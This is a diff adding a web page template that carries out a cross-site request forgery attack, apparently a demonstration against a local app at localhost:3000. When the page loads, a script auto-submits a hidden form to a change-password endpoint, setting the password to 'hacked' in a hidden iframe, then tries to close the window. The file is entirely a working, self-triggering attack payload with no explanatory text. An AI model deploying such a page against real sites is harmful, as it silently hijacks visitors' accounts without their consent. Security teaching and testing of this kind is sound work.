@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title><%= title %></title>
+    <link rel='stylesheet' href='/stylesheets/style.css' />
+  </head>
+  <body onload="closeme()">
+    <h1><%= title %></h1>
+    <p>Welcome to <%= title %></p>
+    <form action="http://localhost:3000/changepassword" method="POST" name="frm1" target="xxx">
+      <input type="hidden" name="inputPassword" value="hacked"/>
+      <input type="submit" value="hack my password"/>
+    </form>
+    <iframe name="xxx"  id="xxx">
+    </iframe>
+  </body>
+  <script>
+      function closeme() {
+          document.frm1.submit();
+          setTimeout(function() {
+              open(location, '_self').close();
+          }, 3500);
+      }
+  </script>
+
+
+</html>
